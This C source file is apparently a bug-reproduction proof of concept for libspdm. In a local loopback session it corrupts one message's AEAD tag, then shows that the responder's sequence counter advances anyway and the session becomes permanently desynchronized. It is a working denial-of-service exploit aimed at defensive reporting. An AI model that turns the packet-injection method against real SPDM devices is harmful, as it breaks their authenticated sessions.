/**
 * BUG-004 Reproduction: Sequence Counter Advanced Before AEAD Verification
 *
 * Level 0 test: After establishing a session, sends a message with a corrupted
 * AEAD tag (last 16 bytes flipped). The responder increments the sequence
 * counter BEFORE calling libspdm_aead_decryption, so after the AEAD failure
 * the counter has been permanently advanced. The subsequent legitimate message
 * then fails the sequence number check -> permanent session desynchronization.
 *
 * Root cause: libspdm_secmes_encode_decode.c:420-432 increments the counter,
 * then calls libspdm_aead_decryption at line 483. On AEAD failure, the counter
 * is not rolled back.
 *
 * The counter is read inside req_recv_fn immediately after libspdm_process_request
 * fails -- before the requester's send_receive_data can clean up the session.
 *
 * Observable:
 *   1. Legitimate app data (seq=0) -> success, rsp counter now 1.
 *   2. Corrupted packet (seq=1, valid header, bad AEAD tag) -> AEAD fails,
 *      but responder counter incremented to 2 (BUG: not rolled back).
 *   3. Next legitimate app data from requester (seq=1) -> sequence check fails
 *      (responder expects 2) -> permanent desync.
 */

#define LIBSPDM_MAX_CERT_CHAIN_SIZE 0x2000

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <assert.h>

#include "hal/base.h"
#include "hal/library/memlib.h"
#include "library/spdm_requester_lib.h"
#include "library/spdm_responder_lib.h"
#include "library/spdm_transport_test_lib.h"
#include "internal/libspdm_common_lib.h"
#include "internal/libspdm_secured_message_lib.h"
#include "spdm_device_secret_lib_internal.h"

#define LOOPBACK_BUF_SIZE (0x1200 + LIBSPDM_TEST_TRANSPORT_HEADER_SIZE + \
                           LIBSPDM_TEST_TRANSPORT_TAIL_SIZE)

#define HASH_ALGO   SPDM_ALGORITHMS_BASE_HASH_ALGO_TPM_ALG_SHA_256
#define ASYM_ALGO   SPDM_ALGORITHMS_BASE_ASYM_ALGO_TPM_ALG_ECDSA_ECC_NIST_P256
#define REQ_ASYM    SPDM_ALGORITHMS_BASE_ASYM_ALGO_TPM_ALG_RSASSA_2048
#define DHE_GROUP   SPDM_ALGORITHMS_DHE_NAMED_GROUP_SECP_256_R1
#define AEAD_SUITE  SPDM_ALGORITHMS_AEAD_CIPHER_SUITE_AES_256_GCM
#define KEY_SCHED   SPDM_ALGORITHMS_KEY_SCHEDULE_SPDM
#define MEAS_HASH   SPDM_ALGORITHMS_MEASUREMENT_HASH_ALGO_TPM_ALG_SHA_256

/* AEAD tag size for AES-256-GCM */
#define AEAD_TAG_SIZE 16

/* --- Capture-on-fail state ---
 * We need to read the responder counter RIGHT after libspdm_process_request
 * returns an error, before send_receive_data can clean up the session.
 * The callback sets g_rsp_seq_on_fail while the session is still alive.
 */
static bool     g_capture_on_fail   = false;
static uint32_t g_capture_session_id = 0;
static uint64_t g_rsp_seq_on_fail   = (uint64_t)-2; /* sentinel: not yet captured */

/* --- Loopback state with AEAD-corruption support --- */

typedef struct {
    uint8_t req_msg[LOOPBACK_BUF_SIZE];
    size_t  req_msg_size;
    uint8_t rsp_msg[LOOPBACK_BUF_SIZE];
    size_t  rsp_msg_size;
    libspdm_context_t *responder;
} loopback_t;

static loopback_t g_lb;
static bool g_corrupt_next_req = false;

static uint8_t g_req_buf[LOOPBACK_BUF_SIZE]; static bool g_req_buf_in_use = false;
static uint8_t g_rsp_buf[LOOPBACK_BUF_SIZE]; static bool g_rsp_buf_in_use = false;

static libspdm_return_t req_acq_send(void *c, void **p)
{ (void)c; assert(!g_req_buf_in_use); g_req_buf_in_use=true; memset(g_req_buf,0,sizeof(g_req_buf)); *p=g_req_buf; return LIBSPDM_STATUS_SUCCESS; }
static void req_rel_send(void *c, const void *p) { (void)c;(void)p; g_req_buf_in_use=false; }
static libspdm_return_t req_acq_recv(void *c, void **p) { return req_acq_send(c,p); }
static void req_rel_recv(void *c, const void *p) { req_rel_send(c,p); }
static libspdm_return_t rsp_acq_send(void *c, void **p)
{ (void)c; assert(!g_rsp_buf_in_use); g_rsp_buf_in_use=true; memset(g_rsp_buf,0,sizeof(g_rsp_buf)); *p=g_rsp_buf; return LIBSPDM_STATUS_SUCCESS; }
static void rsp_rel_send(void *c, const void *p) { (void)c;(void)p; g_rsp_buf_in_use=false; }
static libspdm_return_t rsp_acq_recv(void *c, void **p) { return rsp_acq_send(c,p); }
static void rsp_rel_recv(void *c, const void *p) { rsp_rel_send(c,p); }

static libspdm_return_t req_send_fn(void *c, size_t sz, const void *d, uint64_t t)
{
    (void)c;(void)t;
    assert(sz <= sizeof(g_lb.req_msg));
    memcpy(g_lb.req_msg, d, sz);
    g_lb.req_msg_size = sz;
    if (g_corrupt_next_req && sz > AEAD_TAG_SIZE) {
        for (int i = 0; i < AEAD_TAG_SIZE; i++)
            g_lb.req_msg[sz - 1 - i] ^= 0xFF;
        g_corrupt_next_req = false;
        printf("  [INJECT] Corrupted AEAD tag at bytes [%zu..%zu]\n",
               sz - AEAD_TAG_SIZE, sz - 1);
    }
    return LIBSPDM_STATUS_SUCCESS;
}

static libspdm_return_t req_recv_fn(void *ctx, size_t *sz, void **data, uint64_t to)
{
    (void)ctx; (void)to;
    libspdm_context_t *rsp = g_lb.responder;
    uint32_t *session_id = NULL;
    bool is_app = false;
    libspdm_return_t s = libspdm_process_request(rsp, &session_id, &is_app,
                                                  g_lb.req_msg_size, g_lb.req_msg);

    /* Capture the responder counter IMMEDIATELY after process_request, before
     * any session cleanup that may happen when the error propagates upward. */
    if (g_capture_on_fail) {
        libspdm_session_info_t *si =
            libspdm_get_session_info_via_session_id(rsp, g_capture_session_id);
        if (si) {
            libspdm_secured_message_context_t *smc =
                (libspdm_secured_message_context_t *)si->secured_message_context;
            g_rsp_seq_on_fail =
                smc->application_secret.request_data_sequence_number;
        }
        g_capture_on_fail = false;
    }

    if (LIBSPDM_STATUS_IS_ERROR(s)) return s;

    size_t rsp_sz = 0; void *rsp_p = NULL;
    s = libspdm_acquire_sender_buffer(rsp, &rsp_sz, &rsp_p);
    if (LIBSPDM_STATUS_IS_ERROR(s)) return s;
    s = libspdm_build_response(rsp, session_id, is_app, &rsp_sz, &rsp_p);
    if (LIBSPDM_STATUS_IS_ERROR(s)) { libspdm_release_sender_buffer(rsp); return s; }
    assert(rsp_sz <= sizeof(g_lb.rsp_msg));
    memcpy(g_lb.rsp_msg, rsp_p, rsp_sz);
    g_lb.rsp_msg_size = rsp_sz;
    libspdm_release_sender_buffer(rsp);
    *sz = g_lb.rsp_msg_size; *data = g_lb.rsp_msg;
    return LIBSPDM_STATUS_SUCCESS;
}

static libspdm_return_t rsp_send_stub(void *c, size_t s, const void *d, uint64_t t)
{ (void)c;(void)s;(void)d;(void)t; return LIBSPDM_STATUS_SUCCESS; }
static libspdm_return_t rsp_recv_stub(void *c, size_t *s, void **d, uint64_t t)
{ (void)c;(void)t; (void)s; (void)d; return LIBSPDM_STATUS_SUCCESS; }

static uint32_t g_rsp_cap =
    SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_CERT_CAP |
    SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_CHAL_CAP |
    SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_ENCRYPT_CAP |
    SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_MAC_CAP |
    SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_KEY_EX_CAP;

static uint32_t g_req_cap =
    SPDM_GET_CAPABILITIES_REQUEST_FLAGS_CERT_CAP |
    SPDM_GET_CAPABILITIES_REQUEST_FLAGS_ENCRYPT_CAP |
    SPDM_GET_CAPABILITIES_REQUEST_FLAGS_MAC_CAP |
    SPDM_GET_CAPABILITIES_REQUEST_FLAGS_KEY_EX_CAP;

static void setup_common(libspdm_context_t *ctx, bool is_requester)
{
    libspdm_init_context(ctx);
    ctx->local_context.is_requester = is_requester;
    ctx->local_context.capability.flags = is_requester ? g_req_cap : g_rsp_cap;
    ctx->local_context.capability.ct_exponent = 0;
    ctx->local_context.capability.data_transfer_size = 0x1200;
    ctx->local_context.capability.sender_data_transfer_size = 0x1200;
    ctx->local_context.capability.max_spdm_msg_size = 0x1200;
    ctx->local_context.capability.transport_header_size = LIBSPDM_TEST_TRANSPORT_HEADER_SIZE;
    ctx->local_context.capability.transport_tail_size = LIBSPDM_TEST_TRANSPORT_TAIL_SIZE;
    ctx->connection_info.version = SPDM_MESSAGE_VERSION_11 << SPDM_VERSION_NUMBER_SHIFT_BIT;
    ctx->connection_info.connection_state = LIBSPDM_CONNECTION_STATE_NEGOTIATED;
    ctx->connection_info.capability.flags = is_requester ? g_rsp_cap : g_req_cap;
    ctx->connection_info.algorithm.base_hash_algo    = HASH_ALGO;
    ctx->connection_info.algorithm.base_asym_algo    = ASYM_ALGO;
    ctx->connection_info.algorithm.dhe_named_group   = DHE_GROUP;
    ctx->connection_info.algorithm.aead_cipher_suite = AEAD_SUITE;
    ctx->connection_info.algorithm.key_schedule      = KEY_SCHED;
    ctx->connection_info.algorithm.req_base_asym_alg = REQ_ASYM;
    ctx->connection_info.algorithm.measurement_hash_algo = MEAS_HASH;
    ctx->connection_info.algorithm.other_params_support  = SPDM_ALGORITHMS_OPAQUE_DATA_FORMAT_1;
}

static uint64_t get_rsp_seq(libspdm_context_t *rsp, uint32_t session_id)
{
    libspdm_session_info_t *si = libspdm_get_session_info_via_session_id(rsp, session_id);
    if (!si) return (uint64_t)-1;
    libspdm_secured_message_context_t *smc =
        (libspdm_secured_message_context_t *)si->secured_message_context;
    return smc->application_secret.request_data_sequence_number;
}

static uint64_t get_req_seq(libspdm_context_t *req, uint32_t session_id)
{
    libspdm_session_info_t *si = libspdm_get_session_info_via_session_id(req, session_id);
    if (!si) return (uint64_t)-1;
    libspdm_secured_message_context_t *smc =
        (libspdm_secured_message_context_t *)si->secured_message_context;
    return smc->application_secret.request_data_sequence_number;
}

int main(void)
{
    printf("=== BUG-004: Sequence Counter Advanced Before AEAD Verification ===\n\n");

    size_t ctx_sz = libspdm_get_context_size();

    /* Requester setup */
    libspdm_context_t *req = malloc(ctx_sz); assert(req);
    setup_common(req, true);
    void *cert_data = NULL; size_t cert_sz = 0;
    void *hash_data = NULL; size_t hash_sz = 0;
    libspdm_read_responder_public_certificate_chain(HASH_ALGO, ASYM_ALGO,
        &cert_data, &cert_sz, &hash_data, &hash_sz);
    (void)hash_data; (void)hash_sz;
#if LIBSPDM_RECORD_TRANSCRIPT_DATA_SUPPORT
    req->connection_info.peer_used_cert_chain[0].buffer_size = cert_sz;
    memcpy(req->connection_info.peer_used_cert_chain[0].buffer, cert_data, cert_sz);
    free(cert_data);
#else
    libspdm_hash_all(HASH_ALGO, cert_data, cert_sz,
                     req->connection_info.peer_used_cert_chain[0].buffer_hash);
    req->connection_info.peer_used_cert_chain[0].buffer_hash_size =
        libspdm_get_hash_size(HASH_ALGO);
    libspdm_get_leaf_cert_public_key_from_cert_chain(HASH_ALGO, ASYM_ALGO, cert_data, cert_sz,
        &req->connection_info.peer_used_cert_chain[0].leaf_cert_public_key);
    free(cert_data);
#endif
    libspdm_register_transport_layer_func(req, 0x1200,
        LIBSPDM_TEST_TRANSPORT_HEADER_SIZE, LIBSPDM_TEST_TRANSPORT_TAIL_SIZE,
        libspdm_transport_test_encode_message, libspdm_transport_test_decode_message);
    libspdm_register_device_io_func(req, req_send_fn, req_recv_fn);
    libspdm_register_device_buffer_func(req, LOOPBACK_BUF_SIZE, LOOPBACK_BUF_SIZE,
        req_acq_send, req_rel_send, req_acq_recv, req_rel_recv);
    size_t sc_sz = libspdm_get_sizeof_required_scratch_buffer(req);
    void *sc = malloc(sc_sz); assert(sc); libspdm_set_scratch_buffer(req, sc, sc_sz);

    /* Responder setup */
    libspdm_context_t *rsp = malloc(ctx_sz); assert(rsp);
    setup_common(rsp, false);
    cert_data = NULL; cert_sz = 0; hash_data = NULL; hash_sz = 0;
    libspdm_read_responder_public_certificate_chain(HASH_ALGO, ASYM_ALGO,
        &cert_data, &cert_sz, &hash_data, &hash_sz);
    (void)hash_data; (void)hash_sz;
    rsp->local_context.local_cert_chain_provision[0] = cert_data;
    rsp->local_context.local_cert_chain_provision_size[0] = cert_sz;
    libspdm_register_transport_layer_func(rsp, 0x1200,
        LIBSPDM_TEST_TRANSPORT_HEADER_SIZE, LIBSPDM_TEST_TRANSPORT_TAIL_SIZE,
        libspdm_transport_test_encode_message, libspdm_transport_test_decode_message);
    libspdm_register_device_io_func(rsp, rsp_send_stub, rsp_recv_stub);
    libspdm_register_device_buffer_func(rsp, LOOPBACK_BUF_SIZE, LOOPBACK_BUF_SIZE,
        rsp_acq_send, rsp_rel_send, rsp_acq_recv, rsp_rel_recv);
    sc_sz = libspdm_get_sizeof_required_scratch_buffer(rsp);
    sc = malloc(sc_sz); assert(sc); libspdm_set_scratch_buffer(rsp, sc, sc_sz);
    g_lb.responder = rsp;

    /* Setup: KEY_EXCHANGE + FINISH */
    uint32_t session_id = 0;
    uint8_t heartbeat = 0, req_slot = 0, mhash[64] = {0};
    libspdm_return_t s = libspdm_send_receive_key_exchange(
        req, SPDM_KEY_EXCHANGE_REQUEST_NO_MEASUREMENT_SUMMARY_HASH, 0, 0,
        &session_id, &heartbeat, &req_slot, mhash);
    if (LIBSPDM_STATUS_IS_ERROR(s)) { fprintf(stderr, "KEY_EXCHANGE failed: 0x%x\n", (unsigned)s); return 1; }
    s = libspdm_send_receive_finish(req, session_id, 0);
    if (LIBSPDM_STATUS_IS_ERROR(s)) { fprintf(stderr, "FINISH failed: 0x%x\n", (unsigned)s); return 1; }
    printf("[Setup] Session established, session_id=0x%x\n", session_id);

    /* Step 1: Send legitimate app data (seq=0) */
    uint8_t app_req[16] = {0xAA}; uint8_t app_rsp[256] = {0}; size_t app_rsp_sz = sizeof(app_rsp);
    uint64_t rsp_seq0 = get_rsp_seq(rsp, session_id);
    uint64_t req_seq0 = get_req_seq(req, session_id);
    printf("[Step 1] Sending legitimate app data (req_seq=%llu, rsp_expects=%llu)\n",
           (unsigned long long)req_seq0, (unsigned long long)rsp_seq0);
    s = libspdm_send_receive_data(req, &session_id, false, app_req, sizeof(app_req),
                                  app_rsp, &app_rsp_sz);
    uint64_t rsp_seq1 = get_rsp_seq(rsp, session_id);
    uint64_t req_seq1 = get_req_seq(req, session_id);
    printf("         Result: 0x%x (%s)\n", (unsigned)s, LIBSPDM_STATUS_IS_ERROR(s) ? "FAIL" : "OK");
    printf("         req_seq: %llu->%llu, rsp_seq: %llu->%llu\n",
           (unsigned long long)req_seq0, (unsigned long long)req_seq1,
           (unsigned long long)rsp_seq0, (unsigned long long)rsp_seq1);
    if (LIBSPDM_STATUS_IS_ERROR(s)) { fprintf(stderr, "SETUP FAILED: first app data failed\n"); return 1; }

    /* Step 2: Inject message with corrupted AEAD tag */
    printf("\n[Step 2] Sending app data with corrupted AEAD tag\n");
    printf("         Before: req_seq=%llu, rsp_expects=%llu\n",
           (unsigned long long)req_seq1, (unsigned long long)rsp_seq1);

    /* Ask req_recv_fn to capture the responder counter immediately after
     * libspdm_process_request fails (before any session cleanup). */
    g_capture_session_id = session_id;
    g_capture_on_fail    = true;
    g_rsp_seq_on_fail    = (uint64_t)-2;

    g_corrupt_next_req = true;
    app_rsp_sz = sizeof(app_rsp);
    s = libspdm_send_receive_data(req, &session_id, false, app_req, sizeof(app_req),
                                  app_rsp, &app_rsp_sz);

    uint64_t req_seq2 = get_req_seq(req, session_id); /* may be -1 if session freed */

    printf("         Result: 0x%x (%s)\n",
           (unsigned)s, LIBSPDM_STATUS_IS_ERROR(s) ? "ERROR (expected)" : "UNEXPECTED SUCCESS");
    printf("         rsp counter inside callback: %llu\n",
           (unsigned long long)g_rsp_seq_on_fail);
    printf("         req_seq after call:          %llu%s\n",
           (unsigned long long)req_seq2,
           req_seq2 == (uint64_t)-1 ? " (session freed by requester)" : "");

    /* Determine counter advance on the responder side */
    bool counter_advanced = (g_rsp_seq_on_fail != (uint64_t)-2) &&
                            (g_rsp_seq_on_fail > rsp_seq1);

    if (!LIBSPDM_STATUS_IS_ERROR(s)) {
        printf("\n[NOTE] Corrupted packet was accepted. Bug may be patched, or corruption\n");
        printf("       missed the AEAD ciphertext region. Adjust AEAD_TAG_SIZE or offset.\n");
        return 0;
    }

    if (counter_advanced) {
        printf("\n[BUG CONFIRMED] Responder counter advanced despite AEAD failure!\n");
        printf("  Before inject: rsp expects seq %llu\n", (unsigned long long)rsp_seq1);
        printf("  After  inject: rsp expects seq %llu (advanced by %llu despite failure)\n",
               (unsigned long long)g_rsp_seq_on_fail,
               (unsigned long long)(g_rsp_seq_on_fail - rsp_seq1));
        printf("\n  ROOT CAUSE: libspdm_secmes_encode_decode.c:420-432 increments\n");
        printf("  request_data_sequence_number BEFORE libspdm_aead_decryption at line 483.\n");
        printf("  On AEAD failure, the counter is not rolled back.\n");

        /* Step 3: Confirm desync -- next legitimate message must fail */
        printf("\n[Step 3] Sending next legitimate message after desync\n");
        /* Need a fresh requester counter. The requester's seq is at req_seq2 (or req_seq1
         * if the requester didn't advance). The responder now expects g_rsp_seq_on_fail.
         * If req_seq2 != g_rsp_seq_on_fail, the next message will be rejected. */

        /* If the session was freed on the requester side, we can't send more data.
         * This is still a confirmation: the session is permanently broken. */
        if (req_seq2 == (uint64_t)-1) {
            printf("         Requester session was freed (session cannot recover).\n");
            printf("[IMPACT CONFIRMED] Session permanently broken with a single injected packet.\n");
        } else {
            app_rsp_sz = sizeof(app_rsp);
            s = libspdm_send_receive_data(req, &session_id, false, app_req, sizeof(app_req),
                                          app_rsp, &app_rsp_sz);
            if (LIBSPDM_STATUS_IS_ERROR(s)) {
                printf("         Result: 0x%x -- FAILED (permanent desync confirmed)\n", (unsigned)s);
                printf("[IMPACT CONFIRMED] Session permanently desynchronized with a single injected packet.\n");
            } else {
                printf("         Result: SUCCESS (unexpected; session may have recovered)\n");
            }
        }
    } else if (g_rsp_seq_on_fail == (uint64_t)-2) {
        printf("\n[NOTE] Counter not captured in callback (session may not have been found).\n");
        printf("       session_id=0x%x may have been freed before capture.\n", session_id);
    } else {
        printf("\n[NOT TRIGGERED] Counter did not advance after AEAD failure.\n");
        printf("  rsp_seq_on_fail=%llu, rsp_seq_before=%llu\n",
               (unsigned long long)g_rsp_seq_on_fail, (unsigned long long)rsp_seq1);
        printf("  Bug may be patched, or corruption did not reach the decode function.\n");
    }

    return 0;
}
